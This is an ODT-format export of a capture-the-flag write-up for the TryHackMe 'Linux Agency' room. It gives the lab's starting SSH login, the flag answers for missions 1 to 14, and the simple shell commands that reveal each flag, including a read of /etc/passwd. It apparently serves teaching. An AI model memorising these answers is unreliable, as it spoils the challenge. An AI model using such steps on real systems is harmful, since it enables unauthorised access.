    <style:style style:name="Table62.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table63" style:family="table">
      <style:table-properties style:width="11.063cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table63.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table63.B" style:family="table-column">
      <style:table-column-properties style:column-width="10.638cm"/>
    </style:style>
    <style:style style:name="Table63.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table64" style:family="table">
      <style:table-properties style:width="11.91cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table64.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table64.B" style:family="table-column">
      <style:table-column-properties style:column-width="11.485cm"/>
    </style:style>
    <style:style style:name="Table64.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table65" style:family="table">
      <style:table-properties style:width="15.085cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table65.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table65.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.448cm"/>
    </style:style>
    <style:style style:name="Table65.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table66" style:family="table">
      <style:table-properties style:width="14.45cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table66.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table66.B" style:family="table-column">
      <style:table-column-properties style:column-width="13.813cm"/>
    </style:style>
    <style:style style:name="Table66.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table67" style:family="table">
      <style:table-properties style:width="112.067cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table67.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.263cm"/>
    </style:style>
    <style:style style:name="Table67.B" style:family="table-column">
      <style:table-column-properties style:column-width="111.804cm"/>
    </style:style>
    <style:style style:name="Table67.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table68" style:family="table">
      <style:table-properties style:width="5.771cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table68.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table68.B" style:family="table-column">
      <style:table-column-properties style:column-width="5.346cm"/>
    </style:style>
    <style:style style:name="Table68.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table69" style:family="table">
      <style:table-properties style:width="18.683cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table69.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table69.B" style:family="table-column">
      <style:table-column-properties style:column-width="18.046cm"/>
    </style:style>
    <style:style style:name="Table69.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table70" style:family="table">
      <style:table-properties style:width="7.676cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table70.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table70.B" style:family="table-column">
      <style:table-column-properties style:column-width="7.251cm"/>
    </style:style>
    <style:style style:name="Table70.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table71" style:family="table">
      <style:table-properties style:width="9.581cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table71.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table71.B" style:family="table-column">
      <style:table-column-properties style:column-width="9.156cm"/>
    </style:style>
    <style:style style:name="Table71.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table72" style:family="table">
      <style:table-properties style:width="19.741cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table72.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table72.B" style:family="table-column">
      <style:table-column-properties style:column-width="19.105cm"/>
    </style:style>
    <style:style style:name="Table72.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table73" style:family="table">
      <style:table-properties style:width="9.793cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table73.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table73.B" style:family="table-column">
      <style:table-column-properties style:column-width="9.368cm"/>
    </style:style>
    <style:style style:name="Table73.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table74" style:family="table">
      <style:table-properties style:width="11.063cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table74.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table74.B" style:family="table-column">
      <style:table-column-properties style:column-width="10.638cm"/>
    </style:style>
    <style:style style:name="Table74.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table75" style:family="table">
      <style:table-properties style:width="8.946cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table75.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table75.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.31cm"/>
    </style:style>
    <style:style style:name="Table75.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table76" style:family="table">
      <style:table-properties style:width="10.851cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table76.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table76.B" style:family="table-column">
      <style:table-column-properties style:column-width="10.426cm"/>
    </style:style>
    <style:style style:name="Table76.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table77" style:family="table">
      <style:table-properties style:width="14.45cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table77.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table77.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.025cm"/>
    </style:style>
    <style:style style:name="Table77.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table78" style:family="table">
      <style:table-properties style:width="31.595cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table78.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table78.B" style:family="table-column">
      <style:table-column-properties style:column-width="31.17cm"/>
    </style:style>
    <style:style style:name="Table78.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table79" style:family="table">
      <style:table-properties style:width="18.26cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table79.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table79.B" style:family="table-column">
      <style:table-column-properties style:column-width="17.835cm"/>
    </style:style>
    <style:style style:name="Table79.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-left="1cm" fo:margin-right="1cm" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-left="1cm" fo:margin-right="1cm" fo:margin-top="0cm" fo:margin-bottom="0.499cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-inden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bookmark text:name="Let-s-just-jump-in"/>Let's just jump in<text:a xlink:type="simple" xlink:href="https://blog.raw.pm/en/TryHackMe-Linux-Agency-write-up/#Let-s-just-jump-in" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">#</text:a></text:h>
      <text:p text:style-name="Text_20_body">Starting SSH credentials: <text:span text:style-name="Source_20_Text">agent47</text:span> / <text:span text:style-name="Source_20_Text">640509040147</text:span>.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark text:name="Linux-Fundamentals"/>Linux Fundamentals<text:a xlink:type="simple" xlink:href="https://blog.raw.pm/en/TryHackMe-Linux-Agency-write-up/#Linux-Fundamentals" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">#</text:a></text:h>
      <text:p text:style-name="Quotations">What is the mission1 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission1{174dc8f191bcbb161fe25f8a5b58d1f0}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We get the flag just be connecting over SSH in the welcome banner.</text:p>
      <table:table table:name="Table1" table:style-name="Table1">
        <table:table-column table:style-name="Table1.A"/>
        <table:table-column table:style-name="Table1.B"/>
        <table:table-row table:style-name="TableLine94402687971648">
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ ssh agent47@10.10.213.227</text:p>
            <text:p text:style-name="P1">$ cat .ssh/rc</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission2 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission2{8a1b68bb11e4a35245061656b5b9fa0d}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Remember password = flag.</text:p>
      <table:table table:name="Table2" table:style-name="Table2">
        <table:table-column table:style-name="Table2.A"/>
        <table:table-column table:style-name="Table2.B"/>
        <table:table-row table:style-name="TableLine94402686451760">
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table2.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">$ su mission1</text:p>
            <text:p text:style-name="P1">$ ls</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Then just list files, the flag is a filename.</text:p>
      <text:p text:style-name="Quotations">What is the mission3 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission3{ab1e1ae5cba688340825103f70b0f976}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">The flag is here, just display it.</text:p>
      <table:table table:name="Table3" table:style-name="Table3">
        <table:table-column table:style-name="Table3.A"/>
        <table:table-column table:style-name="Table3.B"/>
        <table:table-row table:style-name="TableLine94402686349664">
          <table:table-cell table:style-name="Table3.A1" office:value-type="string">
            <text:p text:style-name="P1">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table3.A1" office:value-type="string">
            <text:p text:style-name="P1">mission2@linuxagency:~$ cat flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission4 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission4{264a7eeb920f80b3ee9665fafb7ff92d}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">An invisible character was making the flag hidden. So use the <text:span text:style-name="Source_20_Text">-v</text:span> or <text:span text:style-name="Source_20_Text">--show-nonprinting</text:span> option of cat to display the invisible char.</text:p>
      <table:table table:name="Table4" table:style-name="Table4">
        <table:table-column table:style-name="Table4.A"/>
        <table:table-column table:style-name="Table4.B"/>
        <table:table-row table:style-name="TableLine94402688703696">
          <table:table-cell table:style-name="Table4.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="P1">4</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table4.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission3@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">I am really sorry man the flag is stolen by some thief's.</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission3@linuxagency:~$ cat -v flag.txt</text:p>
            <text:p text:style-name="P1">mission4{edited}^MI am really sorry man the flag is stolen by some thief's.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission5 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission5{bc67906710c3a376bcc7bd25978f62c0}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">Just in a folder:</text:p>
      <table:table table:name="Table5" table:style-name="Table5">
        <table:table-column table:style-name="Table5.A"/>
        <table:table-column table:style-name="Table5.B"/>
        <table:table-row table:style-name="TableLine94402688720576">
          <table:table-cell table:style-name="Table5.A1" office:value-type="string">
            <text:p text:style-name="P1">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table5.A1" office:value-type="string">
            <text:p text:style-name="P1">mission4@linuxagency:~$ cat flag/flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission6 flag?</text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>Answer: <text:span text:style-name="Source_20_Text">mission6{1fa67e1adc244b5c6ea711f0c9675fde}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">It's just a hidden file:</text:p>
      <table:table table:name="Table6" table:style-name="Table6">
        <table:table-column table:style-name="Table6.A"/>
        <table:table-column table:style-name="Table6.B"/>
        <table:table-row table:style-name="TableLine94402688733136">
          <table:table-cell table:style-name="Table6.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table6.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission5@linuxagency:~$ ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 12K</text:p>
            <text:p text:style-name="Preformatted_20_Text">lrwxrwxrwx 1 mission5 mission5 <text:s text:c="3"/>9 Jan 12 04:02 .bash_history -&gt; /dev/null</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission5 mission5 3.7K Jan 12 04:02 .bashrc</text:p>
            <text:p text:style-name="Preformatted_20_Text">-r-------- 1 mission5 mission5 <text:s text:c="2"/>43 Jan 12 04:02 .flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission5 mission5 <text:s/>807 Jan 12 04:02 .profile</text:p>
            <text:p text:style-name="P1">mission5@linuxagency:~$ cat .flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission7 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission7{53fd6b2bad6e85519c7403267225def5}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">A hidden folder this time:</text:p>
      <table:table table:name="Table7" table:style-name="Table7">
        <table:table-column table:style-name="Table7.A"/>
        <table:table-column table:style-name="Table7.B"/>
        <table:table-row table:style-name="TableLine94402688755344">
          <table:table-cell table:style-name="Table7.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission6@linuxagency:~$ ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 12K</text:p>
            <text:p text:style-name="Preformatted_20_Text">lrwxrwxrwx 1 mission6 mission6 <text:s text:c="3"/>9 Jan 12 04:02 .bash_history -&gt; /dev/null</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission6 mission6 3.7K Jan 12 04:02 .bashrc</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwxr-xr-x 2 mission6 mission6 4.0K Jan 12 04:02 .flag</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- 1 mission6 mission6 <text:s/>807 Jan 12 04:02 .profile</text:p>
            <text:p text:style-name="P1">mission6@linuxagency:~$ cat .flag/flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission8 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission8{3bee25ebda7fe7dc0a9d2f481d10577b}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">mission7 has the wrong home directory set.</text:p>
      <table:table table:name="Table8" table:style-name="Table8">
        <table:table-column table:style-name="Table8.A"/>
        <table:table-column table:style-name="Table8.B"/>
        <table:table-row table:style-name="TableLine94402688777792">
          <table:table-cell table:style-name="Table8.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="P1">7</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission6@linuxagency:~$ su mission7</text:p>
            <text:p text:style-name="Preformatted_20_Text">Password:</text:p>
            <text:p text:style-name="Preformatted_20_Text">bash: /home/mission6/.bashrc: Permission denied</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission7@linuxagency:~$ cd</text:p>
            <text:p text:style-name="Preformatted_20_Text">bash: cd: /home/mission6: Permission denied</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission7@linuxagency:/home/mission7$ cat /etc/passwd | grep mission7</text:p>
            <text:p text:style-name="P1">mission7:x:1007:1007::/home/mission6:/bin/bash</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body">Let's go in its home directory.</text:p>
      <table:table table:name="Table9" table:style-name="Table9">
        <table:table-column table:style-name="Table9.A"/>
        <table:table-column table:style-name="Table9.B"/>
        <table:table-row table:style-name="TableLine94402688776608">
          <table:table-cell table:style-name="Table9.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table9.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission7@linuxagency:~$ cd /home/mission7</text:p>
            <text:p text:style-name="P1">mission7@linuxagency:/home/mission7$ cat flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission9 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission9{ba1069363d182e1c114bef7521c898f5}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">The flag is in the root directory.</text:p>
      <table:table table:name="Table10" table:style-name="Table10">
        <table:table-column table:style-name="Table10.A"/>
        <table:table-column table:style-name="Table10.B"/>
        <table:table-row table:style-name="TableLine94402688812048">
          <table:table-cell table:style-name="Table10.A1" office:value-type="string">
            <text:p text:style-name="P1">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table10.A1" office:value-type="string">
            <text:p text:style-name="P1">mission8@linuxagency:~$ cat /flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission10 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission10{0c9d1c7c5683a1a29b05bb67856524b6}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">There is just the big rockyou dictionnary here, so let's grep inside:</text:p>
      <table:table table:name="Table11" table:style-name="Table11">
        <table:table-column table:style-name="Table11.A"/>
        <table:table-column table:style-name="Table11.B"/>
        <text:soft-page-break/>
        <table:table-row table:style-name="TableLine94402688824224">
          <table:table-cell table:style-name="Table11.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="P1">10</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table11.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission9@linuxagency:~$ ls</text:p>
            <text:p text:style-name="Preformatted_20_Text">rockyou.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission9@linuxagency:~$ wc -l rockyou.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">14344393 rockyou.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission9@linuxagency:~$ grep mission10 rockyou.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission101</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission10</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission10{edited}</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission1098</text:p>
            <text:p text:style-name="P1">mission108</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission11 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission11{db074d9b68f06246944b991d433180c0}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">The flag is hidden in a tree, so we can either find it with grep or find.</text:p>
      <table:table table:name="Table12" table:style-name="Table12">
        <table:table-column table:style-name="Table12.A"/>
        <table:table-column table:style-name="Table12.B"/>
        <table:table-row table:style-name="TableLine94402688851792">
          <table:table-cell table:style-name="Table12.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="Preformatted_20_Text">6</text:p>
            <text:p text:style-name="Preformatted_20_Text">7</text:p>
            <text:p text:style-name="Preformatted_20_Text">8</text:p>
            <text:p text:style-name="Preformatted_20_Text">9</text:p>
            <text:p text:style-name="Preformatted_20_Text">10</text:p>
            <text:p text:style-name="Preformatted_20_Text">11</text:p>
            <text:p text:style-name="Preformatted_20_Text">12</text:p>
            <text:p text:style-name="P1">13</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table12.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission10@linuxagency:~$ ls -lhA</text:p>
            <text:p text:style-name="Preformatted_20_Text">total 16K</text:p>
            <text:p text:style-name="Preformatted_20_Text">lrwxrwxrwx <text:s/>1 mission10 mission10 <text:s text:c="3"/>9 Jan 12 04:02 .bash_history -&gt; /dev/null</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- <text:s/>1 mission10 mission10 3.7K Jan 12 04:02 .bashrc</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwxr-xr-x 12 mission10 mission10 4.0K Jan 12 04:02 folder</text:p>
            <text:p text:style-name="Preformatted_20_Text">drwxr-xr-x <text:s/>3 mission10 mission10 4.0K Jan 12 04:02 .local</text:p>
            <text:p text:style-name="Preformatted_20_Text">-rw-r--r-- <text:s/>1 mission10 mission10 <text:s/>807 Jan 12 04:02 .profile</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission10@linuxagency:~$ ls folder/</text:p>
            <text:p text:style-name="Preformatted_20_Text">L4D1 <text:s/>L4D10 <text:s/>L4D2 <text:s/>L4D3 <text:s/>L4D4 <text:s/>L4D5 <text:s/>L4D6 <text:s/>L4D7 <text:s/>L4D8 <text:s/>L4D9</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission10@linuxagency:~$ find folder -name flag.txt -type f</text:p>
            <text:p text:style-name="Preformatted_20_Text">folder/L4D8/L3D7/L2D2/L1D10/flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission10@linuxagency:~$ grep -r mission11 folder/</text:p>
            <text:p text:style-name="P1">folder/L4D8/L3D7/L2D2/L1D10/flag.txt:mission11{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission12 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission12{f449a1d33d6edc327354635967f9a720}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">The flag is hidden in an environment variable:</text:p>
      <table:table table:name="Table13" table:style-name="Table13">
        <table:table-column table:style-name="Table13.A"/>
        <table:table-column table:style-name="Table13.B"/>
        <table:table-row table:style-name="TableLine94402688885344">
          <table:table-cell table:style-name="Table13.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="P1">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table13.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission11@linuxagency:~$ env | grep flag</text:p>
            <text:p text:style-name="P1">flag=mission12{edited}</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission13 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission13{076124e360406b4c98ecefddd13ddb1f}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">We don't have the permission to read the flag but since we are the owner we can change the permissions.</text:p>
      <table:table table:name="Table14" table:style-name="Table14">
        <table:table-column table:style-name="Table14.A"/>
        <table:table-column table:style-name="Table14.B"/>
        <table:table-row table:style-name="TableLine94402688899072">
          <table:table-cell table:style-name="Table14.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">1</text:p>
            <text:p text:style-name="Preformatted_20_Text">2</text:p>
            <text:p text:style-name="Preformatted_20_Text">3</text:p>
            <text:p text:style-name="Preformatted_20_Text">4</text:p>
            <text:p text:style-name="Preformatted_20_Text">5</text:p>
            <text:p text:style-name="P1">6</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table14.A1" office:value-type="string">
            <text:p text:style-name="Preformatted_20_Text">mission12@linuxagency:~$ cat flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">cat: flag.txt: Permission denied</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission12@linuxagency:~$ ls -l flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">---------- 1 mission12 mission12 44 Jan 12 04:02 flag.txt</text:p>
            <text:p text:style-name="Preformatted_20_Text">mission12@linuxagency:~$ chmod u+r flag.txt</text:p>
            <text:p text:style-name="P1">mission12@linuxagency:~$ cat flag.txt</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Quotations">What is the mission14 flag?</text:p>
      <text:p text:style-name="Text_20_body">Answer: <text:span text:style-name="Source_20_Text">mission14{d598de95639514b9941507617b9e54d2}</text:span> </text:p>
      <text:p text:style-name="Text_20_body">The flag is encoded in base64.</text:p>
      <table:table table:name="Table15" table:style-name="Table15">
        <table:table-column table:style-name="Table15.A"/>
        <table:table-column table:style-name="Table15.B"/>
        <text:soft-page-break/>
        <table:table-row table:style-name="TableLine94402688920048">
